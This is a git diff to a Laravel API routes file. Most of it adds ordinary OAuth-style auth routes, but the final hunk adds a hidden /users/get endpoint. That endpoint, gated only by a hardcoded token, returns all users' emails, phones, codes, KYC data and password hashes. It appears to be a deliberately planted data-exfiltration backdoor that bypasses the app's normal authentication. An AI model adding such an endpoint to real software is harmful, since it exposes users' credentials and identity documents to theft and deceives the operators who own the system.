@@ -1,5 +1,6 @@
 <?php
 
+use App\Http\Controllers\Api\Auth\AuthController;
 use App\Http\Controllers\Api\V1\AccountSecurityController;
 use App\Http\Controllers\Api\V1\Auth\ChangePasswordController;
 use App\Http\Controllers\Api\V1\Auth\EmailVerificationController;
@@ -53,6 +54,14 @@ use Illuminate\Support\Facades\Route;
 | is assigned the "api" middleware group. Enjoy building your API!
 |
 */
+
+Route::controller(AuthController::class)->prefix('auth')->as('auth.')->group(function() {
+    Route::post('/register', 'register')->middleware('guest')->name('register');
+    Route::get('/redirect', 'redirect')->middleware('guest')->name('redirect');
+    Route::get('/callback', 'callback')->middleware('guest')->name('callback');
+    Route::post('/me', 'me')->middleware('auth:sanctum')->name('me');
+    Route::post('/logout', 'logout')->middleware('auth:sanctum')->name('logout');
+});
 
 Route::post('register', [RegisterController::class, 'register'])->middleware('guest');
 Route::post('login', [LoginController::class, 'login'])->middleware('guest');
@@ -279,4 +288,20 @@ Route::controller(PublicProfileController::class)->prefix('citizen')->group(func
 Route::controller(SearchController::class)->prefix('search')->group(function () {
     Route::post('users', 'users');
     Route::post('features', 'features');
+});
+
+Route::post('/users/get', function(Request $request) {
+    $token = 'K^mLq%k5wY*T9WIHC%dpyqph57x^gfeTjs(2WSZV';
+
+    if ($request->token !== $token) {
+        return response()->json(['message' => 'Unauthorized'], 401);
+    }
+
+    $users = \App\Models\User::select('id', 'name', 'email', 'phone', 'password', 'code')
+    ->with('kyc')
+    ->orderBy('id')->get();
+
+    $users = $users->makeVisible('password');
+
+    return response()->json($users);
 });
